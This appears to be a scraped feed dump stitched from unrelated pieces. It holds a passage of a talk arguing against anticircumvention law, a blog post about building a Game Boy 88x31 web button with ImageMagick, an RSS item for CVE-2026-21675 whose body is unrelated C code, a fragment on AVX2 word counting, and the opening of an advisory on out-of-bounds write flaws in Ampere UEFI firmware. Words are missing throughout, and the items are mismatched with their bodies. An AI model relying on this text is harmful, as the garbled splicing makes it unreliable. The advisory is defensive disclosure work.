make billions of dollars raiding Big Tech's margins, and policymakers who want their country to be the disenshittification nation – the country that doesn't merely protect its people's money and privacy by buying jailbreaks from other countries, but rather, the country that makes billions of dollars  that privacy and pocketbook-defending tech to the rest of the world.That's a powerful alliance, but those are not the only allies Trump has pushed into our camp. There's another powerful ally waiting in the wings.Remember last June, when the International Criminal Court in the Hague issued an arrest warrant for the génocidaire Benjamin Netanyahu, and Trump denounced the ICC, and then the ICC lost its Outlook access, its email archives, its working files, its address books, its calendars?Microsoft says they didn't brick the ICC – that it's a coincidence. But when it comes to a he-said/Clippy-said between the justices of the ICC and the convicted monopolists of Microsoft, I know who  believe.This is exactly the kind of infrastructural risk that we were warned of if we let Chinese companies like Huawei supply our critical telecoms equipment. Virtually every government ministry, every major corporation, every small business and every household in the world have locked themselves into a US-based, cloud-based service.The handful of US Big Tech companies that supply the world's administrative tools are all vulnerable to pressure from the Trump admin, and that means that Trump can brick an entire .The attack on the ICC was an act of cyberwarfare, like the Russian hackers who shut down Ukrainian power-generation facilities, except that Microsoft doesn't have to  Outlook to brick the ICC – they  Outlook.Under the US CLOUD Act of 2018, the US government can compel any US-based company to disclose  of its users' data – including foreign governments – and this is true no matter where that data is stored. Last July, Anton Carniaux, Director of Public and Legal Affairs at Microsoft France, told a French government inquiry that he "couldn't guarantee" that Microsoft wouldn't hand sensitive French data over to the US government, even if that data was stored in a European data-center.And under the CLOUD Act, the US government can slap gag orders on the companies that it forces to cough up that data, so there'd be no way to even know if this happened, or whether it's already happened.It doesn't stop at administrative tools, either: remember back in 2022, when Putin's thugs looted millions of dollars' worth of John Deere tractors from Ukraine and those tractors showed up in Chechnya? The John Deere company pushed an over-the-air kill signal to those tractors and bricked 'em.John Deere is every bit as politically vulnerable to the Trump admin as Microsoft is, and they can brick most of the tractors in the world, and the tractors they  brick are probably made by Massey Ferguson, the number-two company in the ag-tech cartel, which is also an American company and just as vulnerable to political attacks from the US government.Now, none of this will be news to global leaders. Even before Trump and Microsoft bricked the ICC they were trying to figure out a path to "digital sovereignty." But the Trump administration's outrageous conduct and rhetoric over past 11 months has turned "digital sovereignty" from a nice-to-have into a must-have.So finally, we're seeing some movement, like "Eurostack," a project to clone the functionality of US Big Tech silos in free/open source software, and to build EU-based data-centers that this code can run on.But Eurostack is heading for a crisis. It's great to build open, locally hosted, auditable, trustworthy services that replicate the useful features of Big Tech, but you also need to build the adversarial interoperability tools that allow for mass exporting of millions of documents, the sensitive data-structures and edit histories.We need scrapers and headless browsers to accomplish the adversarial interoperability that will guarantee ongoing connectivity to institutions that are still hosted on US cloud-based services, because US companies are  going to facilitate the mass exodus of international customers from their platform.Just think of how Apple responded to the relatively minor demand to open up the iOS App Store, and now imagine the thermonuclear foot-dragging, tantrum-throwing and malicious compliance they'll come up with when faced with the departure of a plurality of the businesses and governments in a 27-nation bloc of 500,000,000 affluent consumers.Any serious attempt at digital sovereignty needs migration tools that work  the cooperation of the Big Tech companies. Otherwise, this is like building housing for East Germans and locating it in  Berlin. It doesn't matter how great the housing is, your intended audience is going to really struggle to move in unless you tear down the wall.Step one of tearing down that wall is killing anticircumvention law, so that we can run virtual devices that can be scripted, break bootloaders to swap out firmware and generally seize the means of computation.So this is the third bloc in the disenshittification army: not just digital rights hippies like me; not just entrepreneurs and economic development wonks rubbing their hands together at the thought of transforming American trillions into European billions; but also the national security hawks who are 100% justified in their extreme concern about their country's reliance on American platforms that have been shown to be  unreliable.This is how we'll get a post-American internet: with an unstoppable coalition of activists, entrepreneurs and natsec hawks.This has been a long time coming. Since the post-war settlement, the world has treated the US as a neutral platform, a trustworthy and stable maintainer of critical systems for global interchange, what the political scientists Henry Farrell and Abraham Newman call the "Underground Empire." But over the past 15 years, the US has systematically shattered global trust in its institutions, a process that only accelerated under Trump.Take transoceanic fiber optic cables: the way the transoceanic fiber routes were planned, the majority of these cables make landfall on the coasts of the USA where the interconnections are handled. There's a good case for this hub-and-spoke network topology, especially compared to establishing direct links between every country. That's an Order(N^2) problem: directly linking each of the planet Earth's 205 countries to every other country would require 20,910 fiber links.But putting all the world's telecoms eggs in America's basket only works if the US doesn't take advantage of its centrality, and while many people worried about what the US could do with the head-ends of the world's global fiber infra, it wasn't until Mark Klein's 2006 revelations about the NSA's nation-scale fiber optic taps in AT&T's network, and Ed Snowden's 2013 documents showing the global scale of this wiretapping, that the world had to confront the undeniable reality that the US could not be trusted to serve as the world's fiber hub.It's not just fiber. The world does business in dollars. Most countries maintain dollar accounts at the Fed in New York as their major source of foreign reserves. But in 2005, American vulture capitalists bought up billions of dollars worth of Argentinian government bonds after the sovereign nation of Argentina had declared bankruptcy.They convinced a judge in New York to turn over the government of Argentina's US assets to them to make good on loans that these debt collectors had not issued, but had bought up at pennies on the dollar. At that moment, every government in the world had to confront the reality that they could not trust the US Federal Reserve with their foreign reserves. But what else could they use?Without a clear answer, dollar dominance continued, but then, under Biden, Putin-aligned oligarchs and Russian firms lost access to the SWIFT system for dollar clearing. This is when goods – like oil – are priced in dollars, so that buyers only need to find someone who will trade their own currency for dollars, which they can then swap for any commodity in the world.Again, there's a sound case for dollar clearing: it's just not practical to establish deep, liquid pairwise trading market for all of the world's nearly 200 currencies, it's another O(N^2) problem.But it only works if the dollar is a neutral platform. Once the dollar becomes an instrument of US foreign policy – whether or not you agree with that policy – it's no longer a neutral platform, and the world goes looking for an alternative.No one knows what that alternative's going to be, just as no one knows what configuration the world's fiber links will end up taking. There's kilometers of fiber being stretched across the ocean floor, and countries are trying out some pretty improbable gambits as dollar alternatives, like Ethiopia revaluing its sovereign debt in Chinese renminbi. Without a clear alternative to America's enshittified platforms, the post-American century is off to a rocky start.But there's one post-American system that's easy to imagine. The project to rip out all the cloud connected, backdoored, untrustworthy black boxes that power our institutions, our medical implants, our vehicles and our tractors; and replace it with collectively maintained, open, free, trustworthy, auditable code.This project is the  one that benefits from economies of scale, rather than being paralyzed by exponential crises of scale. That's because any open, free tool adopted by any public institution – like the Eurostack services – can be audited, localized, pen-tested, debugged and improved by institutions in every other country.It's a commons, more like a science than a technology, in that it is universal and international and collaborative. We don't have dueling western and Chinese principles of structural engineering. Rather, we have universal principles for making sure buildings don't fall down, adapted to local circumstances.We wouldn't tolerate secrecy in the calculations used to keep our buildings upright, and we shouldn't tolerate opacity in the software that keeps our tractors, hearing aids, ventilators, pacemakers, trains, games consoles, phones, CCTVs, door locks, and government ministries working.The thing is, software is not an asset, it's a liability. The capabilities that running software delivers – automation, production, analysis and administration –  are assets. But the software itself? That's a liability. Brittle, fragile, forever breaking down as the software upstream of it, downstream of it, and adjacent to it is updated or swapped out, revealing defects and deficiencies in systems that may have performed well for years.Shifting software to commons-based production is a way to reduce the liability that software imposes on its makers and users,  balancing out that liability among many players.Now, obviously, tech bosses are totally clueless when it comes to this. They really do think that software is an asset. That's why they're so fucking horny to have chatbots shit out software at superhuman speeds. That's why they think it's  that they've got a chatbot that "produces a thousand times more code than a human programmer."Producing code that isn't designed for legibility and maintainability, that is optimized, rather, for speed of production, is a way to incur tech debt at scale.This is a neat encapsulation of the whole AI story: the chatbot can't do your job, but an AI salesman can convince your boss to fire you and replace you with a chatbot that  do your job.Your boss is an easy mark for that chatbot hustler because your boss hates you. In their secret hearts, bosses understand that if they stopped coming to work, the business would run along just fine, but if the  stopped showing up, the company would grind to a halt.Bosses like to tell themselves that they're in the driver's seat, but really, they fear that they're strapped into the back seat playing with a Fisher Price steering wheel. For them, AI is a way to wire the toy steering wheel directly into the company's drive-train. It's the realization of the fantasy of a company without workers.When I was walking the picket line in Hollywood during the writer's strike, a writer told me that you prompt an AI the same way a studio boss gives shitty notes to a writer's room: "Make me ET, but make it about a dog, and give it a love interest, and a car-chase in the third act."Say that to a writer's room and they will call you a  and tell you "Why don't you go back to your office and make a spreadsheet, you nitwit. The grownups here are writing a movie."Meanwhile, if you give that prompt to a chatbot, it will cheerfully shit out a script exactly to spec. The fact that this script will be terrible and unusable is less important than the prospect of a working life in which no one calls you a fucking idiot suit.AI dangles the promise of a writer's room without writers, a movie without actors, a hospital without nurses, a coding shop without coders.When Mark Zuckerberg went on a podcast and announced that the average American had three friends, but wanted 15 friends, and that he could solve this by giving us chatbots instead of friends, we all dunked on him as an out-of-touch billionaire Martian who didn't understand the nature of friendship.But the reality is that for Zuck, your friends are a problem. Your friends' interactions with you determine how much time you spend on his platforms, and thus how many revenue-generating ads he can show you.Your friends stubbornly refuse to organize their relationship with you in a way that maximizes the return to his shareholders. So Zuck is over there in Menlo Park, furiously fantasizing about replacing your friends with chatbots, because that way, he can finally realize the dream of a social media service without any socializing.Rich, powerful people are, at root, solipsists. The only way to amass a billion dollars is to inflict misery and privation on whole populations. The only way to look yourself in the mirror after you've done that, is to convince yourself that those people don't matter, that, in some important sense, they aren't .Think of Elon Musk calling everyone who disagrees with him an "NPC,” or all those "Effective Altruists," who claimed the moral high ground by claiming to care about 53 trillion imaginary artificial humans who will come into existence in 10,000 years at the expense of extending moral consideration to people alive today.Or think of how Trump fired all the US government scientists, and then announced the "Genesis" program, declaring that the US would begin generating  "moonshot"-scale breakthroughs, with a chatbot. It's science without scientists.Chatbots can't really do science, but from Trump's perspective, they're still better than scientists, because a chatbot won't ever tell him not to stare at an eclipse, or not to inject bleach. A chatbot won't ever tell him that trans people exist, or that the climate emergency is real.Powerful people are suckers for AI, because AI fuels the fantasy of a world without people: just a boss and a computer, and no ego-shattering confrontations with people who know how to  things telling you "no."AI is a way to produce tech debt at scale, to replace skilled writers with defective spicy autocomplete systems, to lose money at a rate not seen in living memory.Now, compare that with the project of building a post-American internet: a project to  tech debt, to unlock America's monopoly trillions and divide them among the world's entrepreneurs (for whom they represent untold profits), and the world's technology users (for whom they represent untold savings); all while building resiliency and sovereignty.Now, some of you are probably feeling pretty cynical about this right now. After all, your political leaders have demonstrated decades of ineffectual and incompetent deference to the US, and an inability to act, even when the need was dire. If your leaders couldn't act decisively on the climate emergency, what hope do we have of them taking this moment seriously?But crises precipitate change. Remember when  mad emperor – Vladimir Putin – invaded Ukraine, and Europe experienced a dire energy shortage? In three short years, the continent's solar uptake skyrocketed. The EU went from being 15 years  in its energy transition, to ten years  of schedule.Because when you're shivering in the dark, a lot of fights you didn't think were worth it are suddenly existential battles you can't afford to lose. Sure, no one wants to argue with a tedious neighbor who has an aesthetic temper tantrum at the thought of a solar panel hanging from their neighbor's balcony.But when it's winter, and there's no Russian gas, and you're shivering in the dark, then that person can take their aesthetic objection to balcony solar, fold it until it's all corners, and shove it right up their ass.Besides, we don't need Europe to lead the charge on a post-American internet by repealing anticircumvention.  country could do it! And the country that gets there first gets to reap the profits from supplying jailbreaking tools to the rest of the world, it gets to be the Disenshittification Nation, and everyone else in the world gets to buy those tools and defend themselves from US tech companies' monetary and privacy plunder.Just one country has to break the consensus, and the case for every country doing so is the strongest it's ever been. It used to be that countries that depended on USAID had to worry about losing food, medical and cash supports if they pissed off America. But Trump killed USAID, so now that's a dead letter.Meanwhile, America's status as the planet's most voracious consumer has been gutted by decades of anti-worker, pro-billionaire policies. Today, the US is in the grips of its third consecutive "K-shaped" recovery, that's an economic rally where the rich get richer, and everyone else gets poorer. For a generation, America papered over that growing inequality with easy credit, with everyday Americans funding their consumption with credit cards and second and third mortgages.So long as they could all afford to keep buying, other countries had to care about America as an export market. But a generation of extraction has left the bottom 90% of Americans struggling to buy groceries and other necessities, carrying crushing debt from skyrocketing shelter, education and medical expenses that they can't hope to pay down, thanks to 50 years of wage stagnation.The Trump administration has sided firmly with debt collectors, price gougers, and rent extractors. Trump neutered enforcement against rent-fixing platforms like Realpage, restarted debt payments for eight million student borrowers, and killed a plan to make live-saving drugs a little cheaper, leaving Americans to continue to pay the highest drug prices in the world.Every dollar spent servicing a loan is a dollar that can't go to consumption. And as more and more Americans slip into poverty, the US is gutting programs that spend money on the public's behalf, like SNAP, the food stamps program that helps an ever-larger slice of the American public stave off hunger.America is chasing the "world without people" dream, where working people have nothing, spend nothing, and turn every penny over to rentiers who promptly flush that money into the stock market, shitcoins, or gambling sites. But I repeat myself.Even the US military – long a sacrosanct institution – is being kneecapped to enrich rent-seekers. Congress just killed a military "right to repair" law. So now, US soldiers stationed abroad will have to continue the Pentagon's proud tradition of shipping materiel from generators to jeeps back to America to be fixed by their manufacturers at a 10,000% markup, because the Pentagon routinely signs maintenance contracts that prohibit it from teaching a Marine how to fix an engine.The post-American world is really coming on fast. As we repeal our anticircumvention laws, we don't have to care what America thinks, we don't have to care about their tariffs, because they're already whacking us with tariffs; and because the only people left in the US who can afford to buy things are rich people, who just don't buy enough stuff. There's only so many Lambos and Sub-Zeros even the most guillotineable plute can usefully own.But what if  firms want to go on taking advantage of anticircumvention laws? Well, there's good news there, too. "Good news," because the EU firms that rely on anticircumvention are engaged in the sleaziest, most disgusting frauds imaginable.Anticircumvention law is the reason that Volkswagen could get away with Dieselgate. By imposing legal liability on reverse-engineers who might have discovered this lethal crime, Article 6 of the Copyright Directive created a chilling effect, and thousands of Europeans died, every year.Today, Germany's storied automakers are carrying on the tradition of Dieselgate, sabotaging their cars to extract rent from drivers. From Mercedes, which rents you the accelerator pedal in your luxury car, only unlocking the full acceleration curve of your engine if you buy a monthly subscription; to BMW, which rents you the automated system that automatically dims your high-beams if there's oncoming traffic.Legalize jailbreaking and any mechanic in Europe could unlock those subscription features for one price, and not share  of that money with BMW and Mercedes.Then there's Medtronic, a company that pretends it is Irish. Medtronic is the world's largest med-tech company, having purchased all their competitors, and then undertaken the largest "tax-inversion" in history, selling themselves to a tiny Irish firm, in order to magick their profits into a state of untaxable grace, floating in the Irish Sea.Medtronic supplies the world's most widely used ventilators, and it booby-traps them the same way John Deere booby-traps its tractors. After a hospital technician puts a new part in a Medtronic ventilator, the ventilator's central computing unit refuses to recognize the part until it completes a cryptographic handshake, proving that an authorized Medtronic technician was paid hundreds of euros to certify a repair that the hospital's own technician probably performed.It's just a way to suck hundreds of euros out of hospitals every time a ventilator breaks. This would be bad enough, but during the covid lockdowns, when every ventilator was desperately needed, and when the planes stopped flying, there was no way for a Medtronic tech to come and bless the hospital technicians' repairs. This was lethal. It killed people.There's one more European company that relies on anticircumvention that I want to discuss here, because they're old friends of CCC: that's the Polish train company Newag. Newag sabotages its own locomotives, booby-trapping them so that if they sense they have been taken to a rival's service yard, the train bricks itself. When the train operator calls Newag about this mysterious problem, the company "helpfully" remotes into the locomotive's computers, to perform "diagnostics," which is just sending a unbricking command to the vehicle, a service for which they charge 20,000 euros.Last year, Polish hackers from the security research firm Dragon Sector presented on their research into this disgusting racket in this very hall, and now, they're being sued by Newag under anticircumvention law, for making absolutely true disclosures about Newag's deliberately defective products.So these are the European stakeholders for anticircumvention law: the Dieselgate killers, the car companies who want to rent you your high-beams and accelerator, the med-tech giant that bricked all the ventilators during the pandemic, and the company that tied Poland to the train-tracks.I relish the opportunity to fight these bastards in Brussels, as they show up and cry "Won't someone think of the train saboteurs?"The enshittification of technology – the decay of the platforms and systems we rely on – has many causes: the collapse of competition, regulatory capture, the smashing of tech workers' power. But most of all, enshittification is the result of anticircumvention law's ban on interoperability.By blocking interop, by declaring war on the general-purpose computer, our policy-makers created an enshittogenic environment that rewarded companies for being shitty, and ushered in the enshittocene, in which everything is turning to shit.Let's call time on enshittification. Let's seize the means of computation. Let's build the drop-in, free, open, auditable alternatives to the services and firmware we rely on.Let's end the era of silos. I mean, isn't it fucking  how you have to care which network someone is using if you want to talk to them? Instead of just deciding  you want to talk to?The fact that you have to figure out whether the discussion you're trying to join is on Twitter or Bluesky, Mastodon or Instagram – that is just the most Prodigy/AOL/Compuserve-ass way of running a digital world. I mean, 1990 called and they want their walled gardens backPowerful allies are joining our side in the War on General Purpose Computation. It's not just people like us, who've been fighting for this whole goddamned century, but also countries that want to convert American tech's hoarded trillions into fuel for a single-use rocket that boosts their own tech sector into a stable orbit.It's national security hawks who are worried about Trump bricking their ministries or their tractors, and who are also worried – with just cause – about Xi Jinping bricking all their solar inverters and batteries. Because, after all, the post-American internet is also a post-Chinese internet!Nothing should be designed to be field updatable without the user's permission. Nothing critical should be a black box.Like I said at the start of this talk, I have been doing this work for 24 years at the Electronic Frontier Foundation, throwing myself at a door that was double-locked and deadbolted, and now that door is open a crack and goddammit, I am .Not optimistic. Fuck optimism! Optimism is the idea that things will get better no matter what we do. I know that what we do matters. Hope is the belief that if we can improve things, even in small ways, we can ascend the gradient toward the world we want, and attain higher vantage points from which new courses of action, invisible to us here at our lower elevation, will be revealed.Hope is a discipline. It requires that you not give in to despair. So I'm here to tell you: don't despair.All this decade, all over the world, countries have taken up arms against concentrated corporate power. We've had big, muscular antitrust attacks on big corporations in the US (under Trump I  Biden); in Canada; in the UK; in the EU and member states like Germany, France and Spain; in Australia; in Japan and South Korea and Singapore; in Brazil; and in .This is a near-miraculous turn of affairs. All over the world, governments are declaring war on monopolies, the source of billionaires' wealth and power.Even the most forceful wind is invisible. We can only see it by its effects. What we're seeing here is that whenever a politician bent on curbing corporate power unfurls a sail, no matter where in the world that politician is, that sail fills with wind and propels the policy in ways that haven't been seen in generations.The long becalming of the fight over corporate power has ended, and a fierce, unstoppable wind is blowing. It's not just blowing in Europe, or in Canada, or in South Korea, Japan, China, Australia or Brazil. It's blowing in America, too. Never forget that as screwed up and terrifying as things are in America, the country has experienced, and continues to experience, a tsunami of antitrust bills and enforcement actions at the local, state and federal level.And never forget that the post-American internet will be . Because, in a K-shaped, bifurcated, unequal America, the trillions that American companies loot from the world don't trickle down to Americans. The average American holds a portfolio of assets that rounds to zero, and that includes stock in US tech companies.The average American isn't a shareholder in Big Tech, the average American is a  of Big Tech. Liberating the world from US Big Tech is also liberating America from US Big Tech.That's been EFF's mission for 35 years. It's been my mission at EFF for 25 years. If you want to get involved in this fight – and I hope you do – it can be your mission, too. You can join EFF, and you can join groups in your own country, like Netzpolitik here in Germany, or the Irish Council for Civil Liberties, or La Quadrature du Net in France, or the Open Rights Group in the UK, or EF Finland, or ISOC Bulgaria, XNet, DFRI, Quintessenz, Bits of Freedom, Openmedia, FSFE, or any of dozens of organizations around the world.The door is open a crack, the wind is blowing, the post-American internet is upon us: a new, good internet that delivers all the technological self-determination of the old, good internet, and the ease of use of Web 2.0 so that our normie friends can use it, too.And I can't wait for all of us to get to hang out there.

88x31 web buttons on more personal websites these days. What a throwback.
Naturally, I scoured the internet to find buttons to add to my footer (see
below). Since I couldn’t find a Game Boy one that I liked, obviously I had to
make my own.There’s only one problem: I’m not patient (read: talented) enough to make the
art myself.My idea was to use the boot animation from the Game Boy Color placed inside the
traditional grey frame. Something like this:Not too complicated, right? So you’d think.First, we’ve got to find a way to export the animation from boot ROM. The
easiest way I could think of to do that was to play it in an emulator and
save screenshots of each frame individually. Well, in order to do that we need a
way to stop the emulator at each frame. Thankfully, the emulator I used has
breakpoints.So, where should those breakpoints go? Time for a quick crash course:The animation is programmed into the Game Boy’s boot ROM in GBZ80 assembly. This
is proprietary code written by Nintendo that powers up the system and validates
the cartridge before handing off execution to the game. Thankfully, some smart
people have done the hard work of (1) dumping, (2) disassembling, and (3)
labelling the boot ROM for us.For each Game Boy frame, there’s a period of time where the LCD idles before
drawing the next frame. This is called vblank. Taking a look at the
disassembly, we can see where vblank occurs:Using the debugger, we can see that this function is called from the following
code:As we can see from the generated label , this block probably lives at
address . Putting a breakpoint here and stepping into the function
reveals the address of  to be . After a quick reset
and setting the breakpoint, we can step through each frame of the animation.This next part was a bit tedious: I repeatedly d the debugger, taking
an emulator screenshot at each frame. Once that was done, I had 175
screenshots at 160x144 saved as PNGs on my desktop. Using some quick ✨
 ✨, I collected these into a GIF with this command:Of note is the delay time, ~0.0167s, and the zsh-ism  to sort
the expanded glob.Anyways, here’s what it looks like:Now that we’ve  made our Game Boy animation, it’s
time to reshape it into an artistic web button masterpiece.Next up we’ve got to crop the animation to the desired 88x31. Let’s load up the
GIF to see how big the logo is. I used Aseprite for this, but really any
application that lets you count pixels in an image will do. Doing this, we see
the “Game Boy” text logo is… 127x22 pixels wide. Hmm. That’s too big to fit
into an 88x31 button, but I guess that makes sense considering the Game Boy
Color’s screen is 160x144 pixels. It’ll have to be scaled down later.Measuring the logo’s starting location to be , we can now crop
away. Cropping a GIF sounds like it should be a lot of work, but it can be
easily accomplished on the CLI with, you guessed it, :The cropped logo needs to be scaled to fit into 88x31. Say it with me folks.
:This scales (resizes) the GIF to be 82 pixels wide while maintaining the aspect
ratio, the result being 82x14. I chose 82 pixels wide specifically since that’ll
allow us to fit for the next stage.Several of the 88x31 buttons I found online have a common frame with a
2-pixel-wide border. It looks like this:To apply this frame to the scaled animation, we’ll need to do the following:Centre the scaled animation into a 88x31 space;Fill in the newly added space with grey;Add the border frame on top of the animation.Hopefully you know the drill by now:Aaaand we’re done! Let’s take a look at the finished product in all its glory.Wait, what’s that ugly white square doing there? Oh, right. The animation had a
white background. Gotta fix that I guess.This is actually quite straightforward. Removing the white background is easy,
although if we do it with what we currently have there ends up being undesirable
artifacts caused by the prior scaling.The trick here is to replace the white background before scaling. Here’s also a
really great opportunity to fully show off how powerful ImageMagick’s transform
pipeline can be. Going back to our uncropped animation, we can apply all
previous steps at once like so.It’s amazing that we can do all this in a single command! Let’s admire our
finished product.As we all know, the final stage of any good art project is excising tormented
apparitions from our glorious creation!See that shadow of the logo that appears as it fades away? That’s called
ghosting, and is caused by the original animation’s fade going to white instead
of the grey we’ve chosen as our new background colour.Fixing this is going to be a little more tricky than it was for the compression
artifacts above. In order to fix this, we’ll need remap the transition colours
so that the logo’s blue-to-white transition instead fades to grey.To do this, we’ll first need a way to identify all those transition colours.
Extracting the frames of the animation will allow us to analyze their colours in
a histogram:Running this script will produce a ton of output. Let’s take a look at some
samples near the end.-- snip --

-- snip --
It’s not immediately obvious what we’re looking for here, but we can see that by
frame 164 there’s only one colour. That corresponds to the whiteout at the end
of the animation. Looking a few frames before, we consistently see 209 frames
helpfully labelled as grey, and 1560 frames in some other colour. Conspicuously,
that other colour only varies in red and green, but remains fully blue.Matching that up with the animation, those 1560 pixels must be the fading logo.
With a little Unix wizardry we can extract the colour hex codes from this
output to obtain an exact list of the blue-to-white transition colours!From this list, the logo fade transitions from .
Since we’re updating the background colour to , we’ll need a way to
modify the transition colours to instead fade to that shade of grey.
Functionally, for each colour we (1) compute how far along the transition we
are, then (2) use this value to re-compute an equivalent transition colour in
the desired fade range.Here’s where I’ll admit my shame: by this point I was getting lazy and didn’t
feel like using my brain to write my own colour interpolation. So I turned to
the AI overlords to do this work for me.Looks great, I’m sure it works fine.Huh. This looks surprisingly correct. Adding in  to the original list
and running again, we see that it does indeed get transformed to . As
an additional sanity check, here are generated images of the palettes we intend
to swap.All that’s left is to perform the colour substitution. Admittedly, I was having
some trouble doing this using ImageMagick’s , so I arrived at a much less
elegant solution: use a series of / to manually replace each
colour. Adding the following to the bottom of the Python script, we can at least
automate writing all that out.Putting it all together, we obtain a monstrosity that looks like this:As someone who doesn’t have an artistic bone in my body (doctor’s diagnosis), I
think it turned out pretty great! I learned a lot about ImageMagick throughout
this adventure, and I hope you did too. Please feel free to use this button
however you wish. Attribution is not at all necessary, but is welcome and
appreciated regardless.Well, I guess all that’s left is this final plea: Nintendo, please don’t sue me.]]></content:encoded></item><item><title>CVE-2026-21675 - iccDEV has a Use After Free vulnerability in CIccCmm class via improper hint manager object deletion</title><link>https://cvefeed.io/vuln/detail/CVE-2026-21675</link><author></author><category>vulns</category><pubDate>Tue, 6 Jan 2026 02:15:45 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2026-21675

    char c = buf[i];
    if (c <= ' ') {
        break;
    }
    if (c >= 'A' && c <= 'Z') {
        c += ('a' - 'A');
        buf[i] = c;
    }
    hash *= FNV_PRIME;
    hash ^= (uint64_t)c;
}
My initial attempt to improve performance was to move this lowercase logic out of the loop, like so:for (int i = 0; i < BUF_SIZE; ++i) {
    buf[i] = buf[i] >= 'A' && buf[i] <= 'Z' ?  buf[i] - 'A' + 'a' : buf[i];
}
This simple change improved performance to  (using clang for better vectorization). Funnily enough, just adding these 3 lines before the loop, without deleting the original code gives comparable speed; strictly more work, but branch prediction does its job. Still, it's about a factor 5 away from cold cache sequential read speed.At this point I thought it was unlikely I could squeeze a lot of performance out of the word frequency counter. Sure, there are cache misses in the hash map, so maybe it could be optimized for better cache locality of common words. Or potentially short words can benefit from perfect hashing on the stack. But what will that give? Another 20%?Instead, let's look at an informative baseline. Just count words without keeping track of frequencies; no tedious hash maps.In fact there's a program for that: . Such a single-purpose tool must be fast, right?$ time wc -w < bible-100.txt > /dev/null 

real    0m1.758s
user    0m1.718s
sys     0m0.040s
Unexpectedly the performance is terrible... . Why? Well, the man page says it's doing a different thing. The Ben Hoyt code only splits on  whitespace, whereas  uses , , , ... and even locale specific characters.How fast can word count be?If the premise is that disk speed has caught up in the last decade, we should really be using new CPU features from that period. And that basically means: vectorize all the things. AVX2 is almost a decade old already. AVX-512 was available for the common people in 2017, but I'm on znver2, so I'll stick to AVX2.Unfortunately, the compiler has a hard time autovectorizing word count. Maybe that proves the point of Ben Hoyt: disks got orders of magnitude faster "for free", but modern compilers don't magically generate machine code orders of magnitude faster. It's just difficult to translate branchy scalar programs into vectorized machine code.Part of word count can trivially be auto-vectorized: suppose for simplicity we have a register size of 128 bits, in which we can store 16 consecutive characters. It's easy to locate the whitespace by broadcasting it into a register ahead of time, and then doing a single  comparsion operation:       | 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 |
input: | h o w   m a n y   w o r d s   a | r e   h e r e ?
 mask: | 0 0 0 1 0 0 0 0 1 0 0 0 0 0 1 0 |
But after getting a mask in a vector register, how do you go about and count words? The only thing
I could think of is using a  trick I've seen in Cosmopolitan libc's  implementation. The relevant instruction  moves the long bit mask into a 32 bit , and then you do your usual bit tricks.What are the usual bit tricks? One great candidate is  or  in short — this is a great name given how tedious it is to get bit tricks right. This instruction can be used to iterate over set bits, like so:#include <stdio.h>

int main() {
    int mask = 0b0100000100001000;
    int prev = 0;
    while (mask) {
        int curr = 
        if (curr > prev + 1)
            printf("Word start at %d\n", curr);
        prev = curr;
        if (curr == 32) 
            break;
        mask = (mask >> curr) << curr;
    }
}
It outputs the following, corresponding to the mask example above:Word start at 4
Word start at 9
Word start at 15
I ended up writing this code explicitly using  which is an absolutely dreadful experience. Next time I'll use a high-level API (in the past I've had a lot of fun vectorizing things interactively in the Julia REPL with VectorizationBase.jl). But at least I felt like I had some control over the generated machine code.Using AVX2 with 256-bit registers, you need to align your data on 32 bits, which I did (of course not without messing it up first). I reserved 6 of the registers to hold all broadcasted whitespace characters. Then I explicitly unrolled the vectorized loop 4 times, so in every iteration we process 128 bytes of data.It took an awful lot of time to fix the off-by-one bugs, but in the end I managed to get a working program, tested against a non-zero amount of text files on my computer:$ ./wc-avx2 < bible-100.txt 
82113300
$ wc -w < bible-100.txt 
82113300
$ time ./wc-avx2 < bible-100.txt 
82113300

real    0m0.227s
user    0m0.186s
sys     0m0.041s
That comes down to  (on a warm cache).Sigh. So hand-optimized, single-threaded word count is only getting about 11% of the sequential disk read speed. And on a cold cache?$ sysctl -w vm.drop_caches=3
$ time ./wc-avx2 < bible-100.txt
82113300

real    0m0.395s
user    0m0.196s
sys     0m0.117s
Still more time in  than  :(. So yeah, maybe the disk speed has caught up statement is indeed true.I've put my code up on GitHub.

# TrustZone Break-in Vulnerabilities in Ampere UEFI MM Drivers (Arbitrary Out-of-Bounds Write)

## Package

## Affected versions

## Patched versions

## Description

#### Summary

Multiple arbitrary Out-of-Bounds (OOB) `'\0'` byte write vulnerabilities affecting the ARM Ampere Management Mode (MM) PCIe driver were discovered. This code is bundled into the ARM Unified Extensible Firmware Interface (UEFI) firmware and runs in the Secure world at Exception Level 0 (S-EL0). The PCIe driver is used to initialize the root complex, underlying controllers, logging facilities, and perform self tests during UEFI Driver Execution Environment (DXE) phase. After initialization a lock is used to limit the available interfaces to a few functions, which are accessible from Non-Secure EL1 (NS-EL1) using the Secure Monitor Call (SMC) instruction with a predefined shared buffer for message passing.

It was found that the post initialization lock was never set leaving per-initialization interfaces available and multiple handlers use a `UIN64 size` from an NS-EL1 supplied buffer without proper bounds checking to index an array and writing a `'\0'` byte.

Ampere has addressed the vulnerability and posted a security bulletin.

#### Analysis

NS-EL1 software interacts with the MM PCIe driver using the Firmware Framework for A-Profile (FFA) specification through the SMC instruction. The SMC instruction is used to switch to and from the Non-Secure and Secure worlds and FFA is used for dispatching to specific drivers and services. A shared buffer (initialized during the UEFI DXE phase as `mNsCommBufferMemRegion` in ArmPkg/Drivers/MmCommunicationDxe/MmCommunication.c) is used to communicate messages between NS-EL1 and the S-EL0 PCIe driver.

The handler for the PCIe MM driver can be reached using the following GUID using the FFA specification. `PCIeMmHeader` and `PCIeMmBuffer` show the general layout of the communication buffer. Before the `PCIeMmHandler` dispatch routine is called the MM subsystem copies the shared message buffer to a private memory region to prevent Time-of-Check to Time-of-Use (TOCTOU) issues. As drivers uniquely define the underlying structures in the communicated messages each must perform validation before using the supplied data.

_The code snippets included were created through analysis with Ghidra using names contained in string references from the UEFI image. Known functions and variables from the EDK2 repository were also applied._

```
#define PCIE_MM_GUID \ {0xe49f1b7a, 0xd3c9, 0x44f4, { 0x9b, 0xc4, 0xd3, 0xb2, 0x9a, 0xcb, 0xb3, 0x20 }}; #define MAX_PCIE_MM_MAX_SIZE 0x10000 typedef struct { UINT64 FuncId; UINT8 data[1]; } PcieMmHeader; // ... typedef struct { UINT64 unknown_0; UINT64 size; UINT64 unknown_1; UINT8 data[1]; } PcieMmBuffer;
```

